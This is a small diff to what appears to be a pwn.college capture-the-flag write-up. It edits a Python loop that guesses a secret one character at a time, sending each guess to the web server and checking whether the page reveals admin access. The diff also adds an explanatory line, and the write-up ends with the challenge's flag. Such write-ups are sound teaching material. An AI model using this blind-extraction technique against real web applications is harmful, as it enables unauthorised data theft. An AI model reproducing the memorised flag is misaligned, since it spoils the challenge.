@@ -50,7 +50,7 @@ while True:
         r = requests.post(url, headers=headers, data=data)
         if "admin" in r.text:
             flag += c
-            print(f"{flag}", end="\r", flush=True)
+            print(f"{flag}", end="\r")
             done = c
             if c == "}":
                 print()
@@ -67,6 +67,7 @@ i iterated to each char in charset requests using it as payload untill i found t
 if the payload is right the webserver redirects me to the webpage
 once this happens, i concatenated the right payload to the flag im building
 im done once the last char is }
+i used end="\r" to make the output all in one line avoiding line feed. it looks cooler
 
 ## 🏁 Flag  
 pwn.college{kEcjdXZa6uBzC5hMEUqgaUD8CD8.QXzkzMzwCO4IDOxEzW}
